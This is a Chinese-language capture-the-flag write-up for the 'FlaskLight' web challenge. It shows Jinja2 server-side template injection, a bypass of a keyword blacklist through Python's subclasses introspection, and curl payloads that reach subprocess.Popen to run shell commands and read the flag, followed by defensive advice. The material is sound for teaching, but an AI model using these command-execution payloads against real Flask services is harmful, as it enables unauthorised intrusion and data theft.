# [CSCCTF 2019 Qual]FlaskLight

## 题目信息

- **URL**: http://9326c2ba-77da-4edc-a89c-6b71c404ed25.node5.buuoj.cn:81/
- **类型**: WEB

## 信息收集

访问目标页面，返回以下 HTML：

```html
<!DOCTYPE html>
<html>
<head>
  <title>Flasklight</title>
</head>
<body>
  <marquee><h1>Flasklight</h1></marquee>
  <h2>You searched for:</h2>
  <h3>None</h3>
  <br>
  <h2>Here is your result</h2>
  <h3>['CCC{Fl49_p@l5u}', 'CSC CTF 2019', 'Welcome to CTF Bois', 'CCC{Qmu_T3rtyPuuuuuu}', 'Tralala_trilili']</h3><br>
  <!-- Parameter Name: search -->
  <!-- Method: GET -->
</body>
</html>
```

关键信息：
- 页面标题为 `Flasklight`，使用 Flask 框架
- 存在搜索功能，HTML 注释暴露了参数名 `search`，请求方法 `GET`
- 返回了一些假 flag（CCC 开头），真正的 flag 应该需要进一步获取

## 漏洞分析

由于题目名称提示 Flask，且页面使用了 `render_template_string`（后续通过源码确认），首先尝试 **SSTI（Server-Side Template Injection，服务端模板注入）** 漏洞。

测试 Payload：
```
search={{7*7}}
```

页面返回 `<h3>49</h3>`，说明 `{{7*7}}` 被 Jinja2 模板引擎执行，确认存在 SSTI 漏洞。

### 源码分析（后续读取）

通过 SSTI 读取 `/flasklight/app.py`，源码如下：

```python
from flask import Flask, request, render_template_string, abort

app = Flask(__name__)
app.secret_key = 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}'
result = ["CCC{Fl49_p@l5u}", "CSC CTF 2019", "Welcome to CTF Bois", "CCC{Qmu_T3rtyPuuuuuu}", "Tralala_trilili"]

@app.route("/")
def search():
  global result
  blacklist = ['url_for', 'listdir', 'globals']
  search = request.args.get('search') or None
  if search is not None:
    for black in blacklist:
      if black in search:
        abort(500)
  # ... render_template_string with %s formatting
```

关键发现：
- 使用 `render_template_string` 直接渲染用户输入，导致 SSTI
- 存在黑名单过滤：`url_for`、`listdir`、`globals`
- 但黑名单不包含 `__class__`、`__mro__`、`__subclasses__` 等 Python 内省属性

## 漏洞利用

由于 `globals` 被过滤，不能直接使用 `config.__class__.__init__.__globals__` 等常见路径。改用 `__subclasses__()` 方法枚举所有子类，找到 `subprocess.Popen` 来执行系统命令。

**Step 1: 枚举子类**

```bash
curl -s --get "http://TARGET/" --data-urlencode "search={{''.__class__.__mro__[2].__subclasses__()}}"
```

返回了完整的子类列表（Python 2.7 环境），在列表中找到 `subprocess.Popen` 位于索引 **258**。

**Step 2: 列出根目录**

```bash
curl -s --get "http://TARGET/" --data-urlencode "search={{''.__class__.__mro__[2].__subclasses__()[258]('ls /',shell=True,stdout=-1).communicate()}}"
```

返回：
```
bin  boot  dev  etc  flasklight  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

发现 `/flasklight` 目录。

**Step 3: 列出 /flasklight 目录**

```bash
curl -s --get "http://TARGET/" --data-urlencode "search={{''.__class__.__mro__[2].__subclasses__()[258]('ls -la /flasklight',shell=True,stdout=-1).communicate()}}"
```

返回：
```
total 16
drwxr-xr-x 1 root root 4096 May 28 06:14 .
drwxr-xr-x 1 root root 4096 May 28 06:14 ..
-rw-rw-r-- 1 root root 1571 Apr 11  2020 app.py
-rw-r--r-- 1 root root   43 May 28 06:14 coomme_geeeett_youur_flek
```

**Step 4: 读取 flag 文件**

```bash
curl -s --get "http://TARGET/" --data-urlencode "search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()}}"
```

## 获取 Flag

```
flag{815d2605-9dbc-48b6-967c-9e022605b1f5}
```

## 知识点总结

- **SSTI（服务端模板注入）**：当用户输入直接传入 `render_template_string` 等模板渲染函数时，攻击者可注入 Jinja2 模板表达式执行任意代码
- **Jinja2 沙箱逃逸**：通过 Python 对象内省链 `''.__class__.__mro__[2].__subclasses__()` 枚举所有子类，找到 `subprocess.Popen` 实现命令执行
- **黑名单绕过**：题目过滤了 `globals`、`url_for`、`listdir`，但未过滤 `__subclasses__` 等底层 Python 属性，可通过其他路径绕过
- **Python 2 vs 3**：本题为 Python 2.7 环境，`__mro__` 索引和子类列表与 Python 3 不同
- **防御建议**：永远不要将用户输入直接传入模板渲染函数；使用 Jinja2 的沙箱环境；对用户输入进行严格过滤和转义